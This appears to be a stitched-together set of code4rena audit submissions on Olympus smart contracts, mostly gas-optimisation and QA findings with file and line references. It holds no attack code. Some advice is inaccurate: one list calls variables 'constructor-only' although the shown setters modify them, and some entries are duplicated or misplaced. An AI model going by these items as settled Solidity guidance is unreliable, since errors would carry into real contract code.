modules/PRICE.sol, 231, b'        lastObservationTime = lastObservationTime_;' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 242, b'        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0)' modules/PRICE.sol, 246, b'        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);' modules/PRICE.sol, 246, b'        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);' modules/PRICE.sol, 246, b'        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);' modules/PRICE.sol, 253, b'        lastObservationTime = 0;' modules/PRICE.sol, 255, b'        nextObsIndex = 0;' modules/PRICE.sol, 256, b'        movingAverageDuration = movingAverageDuration_;' modules/PRICE.sol, 257, b'        numObservations = uint32(newObservations);' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 268, b'        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0)' modules/PRICE.sol, 272, b'        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);' modules/PRICE.sol, 272, b'        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);' modules/PRICE.sol, 272, b'        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);' modules/PRICE.sol, 285, b'        lastObservationTime = 0;' modules/PRICE.sol, 287, b'        nextObsIndex = 0;' modules/PRICE.sol, 288, b'        observationFrequency = observationFrequency_;' modules/PRICE.sol, 289, b'        numObservations = uint32(newObservations);' policies/PriceConfig.sol, 49, b'        PRICE.initialize(startObservations_, lastObservationTime_);\r' policies/PriceConfig.sol, 62, b'        PRICE.changeMovingAverageDuration(movingAverageDuration_);\r' policies/PriceConfig.sol, 62, b'        PRICE.changeMovingAverageDuration(movingAverageDuration_);\r' policies/PriceConfig.sol, 73, b'        PRICE.changeObservationFrequency(observationFrequency_);\r' policies/PriceConfig.sol, 73, b'        PRICE.changeObservationFrequency(observationFrequency_);\r' modules/RANGE.sol, 116, b'        return (1, 0);\r' modules/RANGE.sol, 148, b'                _range.low.lastActive = uint48(block.timestamp);\r' modules/RANGE.sol, 136, b'                _range.high.lastActive = uint48(block.timestamp);\r' modules/RANGE.sol, 221, b'        if (market_ == type(uint256).max && marketCapacity_ != 0) revert RANGE_InvalidParams();\r' modules/RANGE.sol, 245, b'            wallSpread_ > 10000 ||\r' modules/RANGE.sol, 246, b'            wallSpread_ < 100 ||\r' modules/RANGE.sol, 247, b'            cushionSpread_ > 10000 ||\r' modules/RANGE.sol, 248, b'            cushionSpread_ < 100 ||\r' modules/RANGE.sol, 264, b'        if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\r' modules/RANGE.sol, 264, b'        if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\r' modules/RANGE.sol, 344, b'            return _range.low.lastActive;\r' modules/RANGE.sol, 342, b'            return _range.high.lastActive;\r' policies/TreasuryCustodian.sol, 60, b'            TRSRY.setApprovalFor(policy_, tokens_[j], 0);\r' modules/TRSRY.sol, 52, b'        return (1, 0);\r' modules/TRSRY.sol, 106, b'        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();\r' modules/VOTES.sol, 28, b'        return (1, 0);\r'  ### G10:USE A MORE RECENT VERSION OF SOLIDITY Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value 
- **Finding**: Constructor parameter are not validated     **Severity:** QA     **Description:**     Constructor parameters are not validated at:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L77     To mitigate the risk of misconfiguration, it's recommended to validate `tokens_` and `rangeParams_` parameters     (the former is used to set immutable variables, which cannot be modified after being set incorrectly in constructor).  - **Finding**: Misconfiguration risk due to usage of arrays to pass function arguments     **Severity:** QA     **Description:**     The usage of arrays when passing multiple arguments to functions can cause misconfiguration issues because deployer/     user has to ensure the order of array elements is correct when calling a function. It's recommended to use parameters     structures in these cases:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L79-L80         For `tokens_` and `rangeParams_`. Passing tokens in a wrong order might result in an unusable contract.     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L96-L97         For `tokens_` and `configParams`. Passing tokens in a wrong order might result in an unusable contract. `configParams` contains many values that are hard to read/track in the code since they're referenced by their index in the array, not their name.      Poor readability of array arguments forced developers to add the comments with argument names and their order.      An example of a parameters structure:     - https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L128     - https://github.com/Uniswap/v3-periphery/blob/75f3b72b4412b41e31c2a2370bb52d55f99ec717/contracts/interfaces/INonfungiblePositionManager.sol#L79-L91  - **Finding**: Poor validation of "debt buffer" arguments     **Severity:** QA     **Description:**     These function arguments are not validated according to the documentation:     - `cushionDebtBuffer` at https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97     - `debtBuffer_` at https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527          In both of these cases, the passed value is checked to be lower than `10000`, however, in [MarketParams     documentation in IBondAuctioneer](https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondAuctioneer.sol#L31-L35):     > Minimum is the greater of 10% or initial max payout as a percentage of capacity.     > The value must be > 10% but can exceed 100% if desired.      Also, the documentation says:     > If the value is too small, the market will not be able function normally and close prematurely.      However, there's no minimal value check in the above functions.  - **Finding**: Unused function     **Severity:** QA     **Description:**     `fromRole` in `KernelUtils.sol` is not used:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L26
-> X = X + Y IS CHEAPER THAN X += Y (same for X = X - Y IS CHEAPER THAN X -= Y)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=reserveDebt%5Btoken_%5D%5Bmsg.sender%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=reserveDebt%5Btoken_%5D%5Bmsg.sender%5D%20%2D%3D%20received%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2D%3D%20received%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=oldDebt%20%3C%20amount_)-,totalDebt%5Btoken_%5D%20%2B%3D%20amount_,-%2D%20oldDebt%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2D%3D%20oldDebt https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_movingAverage%20%2B%3D%20(currentPrice%20%2D%20earliestPrice)%20/%20numObs%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_movingAverage%20%2D%3D%20(earliestPrice%20%2D%20currentPrice)%20/%20numObs%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=total%20%2B%3D%20startObservations_%5Bi%5D%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#:~:text=balanceOf%5Bfrom_%5D%20%2D%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#:~:text=balanceOf%5Bto_%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=_amountsPerMarket%5Bid_%5D%5B0%5D%20%2B%3D%20inputAmount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=_amountsPerMarket%5Bid_%5D%5B1%5D%20%2B%3D%20outputAmount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#:~:text=lastBeat%20%2B%3D%20frequency()%3B   ->STATE VARIABLES ONLY SET IN THE CONSTRUCTOR SHOULD BE DECLARED IMMUTABLE  Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a PUSH32 (3 gas)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=uint256%20internal%20immutable%20_scaleFactor%3B  -> ++i costs less gas compared to i++ or i += 1 (Also --i costs less gas compared to i-- or i -= 1)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=A%2DZ%20only-,unchecked%20%7B,i%2B%2B%3B,-%7D https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=%7D-,unchecked%20%7B,i%2B%2B%3B,-%7D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=/%2010%3B-,decimals%2B%2B,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%20true%3B-,_status.low.count%2B%2B,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%20false%3B-,_status.low.count%2D%2D,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_status.high.count%2B%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_status.high.count%2D%2D   -> USAGE OF UINTS/INTS SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=%3D%3E%20mapping(-,bytes4,-%3D%3E%20bool))) https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=)%20pure%20returns-,(bytes5),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=override%20returns%20(-,uint8%20major%2C,-uint8%20minor)%20%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=uint8%20major%2C-,uint8%20minor),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=by%20the%20contract.-,uint8,-public%20constant%20decimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_ohmEthPriceFeed%20%3D%20ohmEthPriceFeed_%3B-,uint8,-ohmEthDecimals%20%3D%20_ohmEthPriceFeed https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#:~:text=override%20returns%20(-,uint8%20major,-%2C%20uint8%20minor https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#:~:text=uint8%20major%2C-,uint8%20minor),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=public%20immutable%20ohm%3B-,uint8,-public%20immutable%20ohmDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=public%20immutable%20reserve%3B-,uint8,-public%20immutable%20reserveDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=is%20the%20priceDecimal%20value-,int8,-priceDecimals%20%3D%20_getPriceDecimals(range https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=cushion.high.price)%3B-,int8,-scaleAdjustment%20%3D%20int8 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=int8%20scaleAdjustment%20%3D-,int8,-(ohmDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(ohmDecimals)%20%2D-,int8,-(reserveDecimals)%20%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=uint256%20bondScale%20%3D%2010%20**-,uint8(,-36%20%2B%20scaleAdjustment%20%2B%20int8(reserveDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=the%20low%20side-,uint8,-oracleDecimals%20%3D%20PRICE https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=is%20the%20priceDecimal%20value-,int8,-priceDecimals%20%3D%20_getPriceDecimals(invCushionPrice https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_getPriceDecimals(invCushionPrice)%3B-,int8,-scaleAdjustment%20%3D%20int8 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=int8%20scaleAdjustment%20%3D-,int8,-(reserveDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(reserveDecimals)%20%2D-,int8,-(ohmDecimals)%20%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%2010**-,uint8,-(int8(oracleDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=**uint8(-,int8,-(oracleDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%2B%20scaleAdjustment%20%2B-,int8,-(ohmDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(ohmDecimals)%20%2D-,int8,-(reserveDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=return%20decimals%20%2D-,int8,-(PRICE.decimals   ->IT COSTS MORE GAS TO INITIALIZE NON-CONSTANT/NON-IMMUTABLE VARIABLES TO ZERO THAN TO LET THE DEFAULT OF ZERO BE APPLIED  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=for%20(-,uint256%20i%20%3D%200%3B,-i%20%3C%205 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=for-,(uint256%20i%20%3D%200,-%3B%20i%20%3C%2032   ->USING BOOLS FOR STORAGE INCURS OVERHEAD  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=mapping(bytes4%20%3D%3E%20bool))) https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=mapping(Role%20%3D%3E%20bool)) https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=if%20role%20exists.-,mapping(Role%20%3D%3E%20bool),-public%20isRole%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=and%20therefore%20active).-,bool,-public%20initialized%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=bool%20public%20initialized%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=Operator%20is%20active-,bool%20public%20active%3B,-///%20Modules https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=mapping(uint256%20%3D%3E%20bool) https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#:~:text=stopped%2C%20true%20%3D%20beating-,bool%20public%20active%3B,-///%20%40notice%20Timestamp%20of https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#:~:text=mapping(address%20%3D%3E%20bool)  
**Kernel.sol** - L70/88/119/223/229 - Gas can be saved if instead of using a modifier a private view function is used, this would reduce all the costs of validating the access control of an address.  - L397 - When you want to set a variable with its default value, it is less expensive not to set it since it has that default value, this reduces some gas units without losing understanding of the code.  **KernelUtils.sol** - L43/58 - When you want to set a variable with its default value, it is less expensive not to set it since it has that default value, this reduces some gas units without losing understanding of the code.  - L49/64 - It is less expensive to do the ++i operation than to do i++, without losing understanding of the code.  **TRSRY.sol** - L131/132 - When previously it is validated that the operation returns a value without overflow/underflow, it can be wrapped with unchecked in order to spend less gas when performing the mathematical operation. What could be unchecked is the operation, not the validation of the if.  **PRICE.sol** - L6 - The ERC20 class is imported, but it is never used, this generates unnecessary extra gas costs.  - L136/138 - When it is previously validated that the operation returns a value without overflow/underflow, it can be wrapped with unchecked in order to spend less gas when performing the mathematical operation. What could be unchecked is the operation, not the validation of the if.  **BondCallback.sol** - L120 - It is necessary to validate that outputAmount_ > inputAmount_ so that it does not throw an exception without any underflow message. In addition, the outputAmount_ - inputAmount_ operation can become unchecked so that what has already been validated is not validated.  - L223/306 - Instead of validating "validation == true" or "validation == false" it is much simpler and less expensive to validate "validation" or "!validation".  - L278 - In a for loop instead of consulting the length of the array to be iterated in each iteration, the least expensive thing is to create a variable in memory of the value of array.length  **RANGE.sol** - L133/145 - It is less expensive in a validation that the less expensive operation is ahead, since it avoids executing the second more expensive validation.  **Heart.sun** - L26 - an error is created that is not used anywhere, it should be eliminated.   **TreasuryCustodian.sol** - L11 - an error is created that is not used anywhere, it should be eliminated.   **Operator.sol** - L188 - The modifier can generate much less gas cost, if instead of a modifier it were a private view function.  - L488/670/675 - It is less expensive to make ++variable than to make variable++, without modifying the understanding of the code. 
# [G-01] **tate variables only set in the constructor should be declared `immutable`** (Avoids a Gsset (20000 gas)):    1. File: 2022-08-olympus/src/Kernel.sol (line 155-158):     `    address public executor;      /// @notice Address that is responsible for assigning policy-defined roles to addresses.     address public admin;`  2. File: 2022-08-olympus/src/Kernel.sol (line 188):     `Policy[] public activePolicies;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 41-56):     `    uint256[] public observations;      /// @notice Index of the next observation to make. The current value at this index is the oldest observation.     uint32 public nextObsIndex;      /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.     uint32 public numObservations;      /// @notice Frequency (in seconds) that observations should be stored.     uint48 public observationFrequency;      /// @notice Duration (in seconds) over which the moving average is calculated.     uint48 public movingAverageDuration;      /// @notice Unix timestamp of last observation (in seconds).     uint48 public lastObservationTime;`  4. File: 2022-08-olympus/src/modules/INSTR.sol (line 13):     `uint256 public totalInstructions;`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 76-78):     `   IBondAuctioneer public auctioneer;     /// @notice     Callback contract used for cushion bond market payouts     IBondCallback public callback;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 28-32):     `    IBondAggregator public aggregator;     OlympusTreasury public TRSRY;     OlympusMinter public MINTR;     Operator public operator;     ERC20 public ohm;`  7. File: 2022-08-olympus/src/policies/Heart.sol (line 36-42):     `    uint256 public lastBeat;      /// @notice Reward for beating the Heart (in reward token decimals)     uint256 public reward;      /// @notice Reward token address that users are sent for beating the Heart     ERC20 public rewardToken;`      8. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 10):     `OlympusVotes public VOTES;`          # [G-02] `x = x + y` is cheaper than `x += y`:    1. File: 2022-08-olympus/src/modules/TRSRY.sol (line 115-116):     `        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 132):     `else totalDebt[token_] -= oldDebt - amount_;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 138):     `_movingAverage -= (earliestPrice - currentPrice) / numObs;`  4. File: 2022-08-olympus/src/modules/VOTES.sol (line 56):     `balanceOf[from_] -= amount_;`         5. File: 2022-08-olympus/src/policies/Governance.sol (line 194):     `totalEndorsementsForProposal[proposalId_] -= previousEndorsement;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 28-32):     `    IBondAggregator public aggregator;     OlympusTreasury public TRSRY;     OlympusMinter public MINTR;     Operator public operator;     ERC20 public ohm;`  7. File: 2022-08-olympus/src/modules/TRSRY.sol (line 96-97):     `        reserveDebt[token_][msg.sender] += amount_;         totalDebt[token_] += amount_;`  8. File: 2022-08-olympus/src/modules/TRSRY.sol (line 131):     `if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;`   9. File: 2022-08-olympus/src/modules/PRICE.sol (line 136):     `_movingAverage += (currentPrice - earliestPrice) / numObs;`  10. File: 2022-08-olympus/src/modules/PRICE.sol (line 222):     `total += startObservations_[i];`   11. File: 2022-08-olympus/src/modules/VOTES.sol (line 58):     `balanceOf[to_] += amount_;`  12. File: 2022-08-olympus/src/policies/BondCallback.sol (line 143-144):     `        _amountsPerMarket[id_][0] += inputAmount_;         _amountsPerMarket[id_][1] += outputAmount_;`  13. File: 2022-08-olympus/src/policies/Heart.sol (line 103):     `lastBeat += frequency();`   14. File: 2022-08-olympus/src/policies/Governance.sol (line 198):     `totalEndorsementsForProposal[proposalId_] += userVotes;`  15. File: 2022-08-olympus/src/policies/Governance.sol 252-254):     `            yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;`                                                # [G-03] `<array>.length` should not be looked up in every loop of a `for` loop:    1. File: 2022-08-olympus/src/policies/Governance.sol (line 278):     `for (uint256 step; step < instructions.length; ) {`               # [G-04] Not using the named return variables when a function returns, wastes deployment gas:    1. File: 2022-08-olympus/src/modules/RANGE.sol (line 276):     `return _range;`  2. File: 2022-08-olympus/src/policies/Operator.sol (line 784):     `return _status;`  3. File: 2022-08-olympus/src/policies/Operator.sol (line 799):     ` return _config;`         # [G-05] It costs more gas to initialize variables to zero than to let the default of zero be applied:    1. File: 2022-08-olympus/src/Kernel.sol (line 276):     `for (uint256 i = 0; i < reqLength; ) {`  2. File: 2022-08-olympus/src/utils/KernelUtils.sol (line 58):     `for (uint256 i = 0; i < 32; ) {`  3. File: 2022-08-olympus/src/utils/KernelUtils.sol (line 43):     `for (uint256 i = 0; i < 5; ) {`  4. File: 2022-08-olympus/src/modules/PRICE.sol (line 253-255):     `        lastObservationTime = 0;         _movingAverage = 0;         nextObsIndex = 0;`         5. File: 2022-08-olympus/src/modules/PRICE.sol (line 285-287):     `        lastObservationTime = 0;         _movingAverage = 0;         nextObsIndex = 0;`  6. File: 2022-08-olympus/src/policies/Operator.sol(line 574-575):     `        _status.high.count = 0;         _status.high.nextObservation = 0;`   7. File: 2022-08-olympus/src/policies/Operator.sol (line 578-579):     `        _status.low.count = 0;         _status.low.nextObservation = 0;`           # [G-06] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead (> When using elements that are smaller than 32 bytes, your  contract’s gas usage may be higher. This is because the EVM operates on  32 bytes at a time. Therefore, if the element is smaller than that, the  EVM must use more operations in order to reduce the size of the element  from 32 bytes to the desired size. >   [https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) Use a larger size then downcast where needed):    1. File: 2022-08-olympus/src/Kernel.sol (line 100):     `function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 51):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  3. File: 2022-08-olympus/src/modules/MINTR.sol (line 25):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  4. File: 2022-08-olympus/src/modules/RANGE.sol (line 45):     `uint48 lastActive;`         5. File: 2022-08-olympus/src/modules/RANGE.sol (line 115):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  6. File: 2022-08-olympus/src/modules/RANGE.sol(line 136):     `_range.high.lastActive = uint48(block.timestamp);`   7. File: 2022-08-olympus/src/modules/RANGE.sol (line 148):     `_range.low.lastActive = uint48(block.timestamp);`      8. File: 2022-08-olympus/src/modules/PRICE.sol (line 27-28):     `    event MovingAverageDurationChanged(uint48 movingAverageDuration_);     event ObservationFrequencyChanged(uint48 observationFrequency_);`         9. File: 2022-08-olympus/src/modules/PRICE.sol (line 44-59):     ` uint32 public nextObsIndex;      /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.     uint32 public numObservations;      /// @notice Frequency (in seconds) that observations should be stored.     uint48 public observationFrequency;      /// @notice Duration (in seconds) over which the moving average is calculated.     uint48 public movingAverageDuration;      /// @notice Unix timestamp of last observation (in seconds).     uint48 public lastObservationTime;      /// @notice Number of decimals in the price values provided by the contract.     uint8 public constant decimals = 18;`  10. File: 2022-08-olympus/src/policies/Operator.sol(line 75-76):     `        uint48 observationFrequency_,         uint48 movingAverageDuration_`   11. File: 2022-08-olympus/src/policies/Operator.sol (line 84):     `uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();`  12. File: 2022-08-olympus/src/modules/PRICE.sol (line 87):     `uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();`  13. File: 2022-08-olympus/src/modules/PRICE.sol (line 97):     `numObservations = uint32(movingAverageDuration_ / observationFrequency_);`  14. File: 2022-08-olympus/src/modules/PRICE.sol (line 113):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`   15. File: 2022-08-olympus/src/modules/PRICE.sol (line 127):     `uint32 numObs = numObservations;`  16. File: 2022-08-olympus/src/modules/PRICE.sol (line 143):     `lastObservationTime = uint48(block.timestamp);`    17. File: 2022-08-olympus/src/modules/PRICE.sol (line 185):     `uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;`  18. File: 2022-08-olympus/src/modules/PRICE.sol (line 215):     `if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))`  19. File: 2022-08-olympus/src/modules/PRICE.sol (line 240):     `function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {`  20. File: 2022-08-olympus/src/modules/PRICE.sol (line 257):     `numObservations = uint32(newObservations);`  21. File: 2022-08-olympus/src/modules/PRICE.sol (line 266):     `function changeObservationFrequency(uint48 observationFrequency_) external permissioned {`  22. File: 2022-08-olympus/src/modules/PRICE.sol (line 289):     `numObservations = uint32(newObservations);`  23. 2022-08-olympus/src/modules/VOTES.sol (line 27):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  24. 2022-08-olympus/src/modules/INSTR.sol (line 28):     `function VERSION() public pure override returns (uint8 major, uint8 minor) {`  25. 2022-08-olympus/src/policies/Operator.sol (line 51-54):     `    event CushionFactorChanged(uint32 cushionFactor_);     event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);     event ReserveFactorChanged(uint32 reserveFactor_);     event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_);`  26. 2022-08-olympus/src/policies/Operator.sol (line 83):     `uint8 public immutable ohmDecimals;`  27. 2022-08-olympus/src/policies/Operator.sol (line 86-89):     `    uint8 public immutable reserveDecimals;      /// Constants     uint32 public constant FACTOR_SCALE = 1e4;`  28. 2022-08-olympus/src/policies/Operator.sol (line 51-54):     `uint32[8] memory configParams`  29. 2022-08-olympus/src/policies/Operator.sol (line 106-108):     `        if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();          if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])`  30. 2022-08-olympus/src/policies/Operator.sol (line 116):     `configParams[7] == uint32(0)`  31. 2022-08-olympus/src/policies/Operator.sol (line 127-129):     `            count: uint32(0),             lastRegen: uint48(block.timestamp),             nextObservation: uint32(0),`  32. 2022-08-olympus/src/policies/Operator.sol (line 210):     `uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&`  33. 2022-08-olympus/src/policies/Operator.sol (line 216):     `uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&`  34. 2022-08-olympus/src/policies/Operator.sol (line 403-404):     `                vesting: uint48(0), // Instant swaps                 conclusion: uint48(block.timestamp + config_.cushionDuration),`  35. 2022-08-olympus/src/policies/Operator.sol (line 418):     `uint8 oracleDecimals = PRICE.decimals();`  36. 2022-08-olympus/src/policies/Operator.sol (line 455-456):     `                vesting: uint48(0), // Instant swaps                 conclusion: uint48(block.timestamp + config_.cushionDuration),`   37. 2022-08-olympus/src/policies/Operator.sol (line 516):     `function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {`  38. 2022-08-olympus/src/policies/Operator.sol (line 528-530):     `        uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_`   39. 2022-08-olympus/src/policies/Operator.sol (line 535-536):     `        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();         if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)`  40. 2022-08-olympus/src/policies/Operator.sol (line 548):     `function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {`  41. 2022-08-olympus/src/policies/Operator.sol (line 560-562):     `        uint32 wait_,         uint32 threshold_,         uint32 observe_`  42. 2022-08-olympus/src/policies/Operator.sol (line 665):     `uint32 observe = 